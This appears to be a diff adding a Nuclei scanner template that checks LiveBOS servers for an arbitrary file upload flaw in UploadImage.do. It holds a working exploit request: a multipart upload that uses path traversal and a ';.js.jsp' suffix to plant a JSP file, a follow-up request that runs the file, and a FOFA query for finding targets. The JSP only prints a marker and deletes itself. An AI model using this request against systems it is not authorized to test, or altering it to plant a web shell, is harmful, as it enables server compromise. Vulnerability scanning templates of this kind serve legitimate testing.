@@ -1,0 +1,41 @@
+id: livebos-file-upload
+
+info:
+  name: LiveBOS UploadImage.do - Arbitrary File Upload
+  author: qwtd
+  severity: high
+  metadata:
+    max-request: 2
+    fofa-query: app="LiveBOS-框架" && body="管理控制台"
+  tags: LiveBOS
+
+http:
+  - raw:
+      - |
+        POST /feed/UploadImage.do;.js.jsp HTTP/1.1
+        Host:{{Hostname}}
+        Httpsendrequestex: true
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Cookie: zhzbsessionname=35FF312409BF3CAC561D5BC776643A05
+        Content-Type: multipart/form-data;boundary=--------------------------WebKitFormBoundaryxegqoxxi
+        Content-Length: 222
+
+        ---WebKitFormBoundaryxegqoxxi
+        Content-Disposition:form-data;name="file";filename=//../../../../{{randstr_1}}.jsp"
+        Content-Type: image/jpeg
+
+        <%@ page import="java.io.File" %><% out.println("{{randstr_2}}"); String filePath = application.getRealPath(request.getServletPath()); new File(filePath).delete();%>
+        ---WebKitFormBoundaryxegqoxxi--
+
+      - |
+        GET /{{randstr_1}}.jsp;.js.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_1, "showImage()") && contains(body_1, "newFileName") && status_code_1 == 200'
+          - 'contains(body_2, "{{randstr_2}}") && status_code_1 == 200'
+        condition: and
+
